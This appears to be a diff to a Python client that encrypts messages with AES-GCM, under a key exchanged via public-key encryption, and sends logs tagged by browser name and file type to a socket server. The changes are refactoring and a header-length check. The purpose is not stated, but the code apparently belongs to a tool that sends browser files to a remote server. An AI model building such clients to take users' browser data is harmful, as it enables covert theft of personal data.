@@ -64,7 +64,7 @@ def socket_initialise() -> None:
 
     # Generate AES cipher
     aes_cipher = AES.new(aes_key, AES.MODE_GCM, aes_nonce)
-    socket_info['cipher'] = aes_cipher
+    socket_info['aes_cipher'] = aes_cipher
 
     # Encrypt AES key and nonce with public key
     socket_send_message({
@@ -89,18 +89,28 @@ def socket_send_message(data: dict, cipher) -> None:
 
     # Encode data
     encoded_data = json.dumps(data).encode(FORMAT)
+    encoded_data = pad(encoded_data, AES.block_size)
+
+    # Check whether encrypting with AES-GCM will exceed the client header size limit 
+    if cipher == socket_info['aes_cipher']:
+        # Check message length (same before and after encryption)
+        message_length = len(encoded_data)
+        header = str(message_length).encode(FORMAT)
+
+        # Check if header length is allowed by server
+        header_length = len(header)
+        if header_length > CLIENT_HEADER_LEN:
+            raise ValueError('Message length exceeds size limit allowed by server')
 
     # Encrypt data
-    encrypted_data = cipher.encrypt(pad(encoded_data, AES.block_size))
-
-    # Calculate message length
+    encrypted_data = cipher.encrypt(encoded_data)
     message_length = len(encrypted_data)
 
     # Send message length as header
-    message_length = str(message_length).encode(FORMAT)
-    header_length = len(message_length)
+    header = str(message_length).encode(FORMAT)
+    header_length = len(header)
     padding = b' ' * (CLIENT_HEADER_LEN - header_length)
-    client.send(message_length + padding)
+    client.send(header + padding)
 
     # Send message
     print(f'Sent {len(encrypted_data)} bytes')
@@ -110,7 +120,7 @@ def socket_send_message(data: dict, cipher) -> None:
 @try_socket
 def socket_send_log(data: dict, browser_name: str, file_name: str) -> None:
     """ Send log to socket server """
-    aes_cipher = socket_info['cipher']
+    aes_cipher = socket_info['aes_cipher']
     socket_send_message({
         'browser': browser_name,
         'type': file_name,
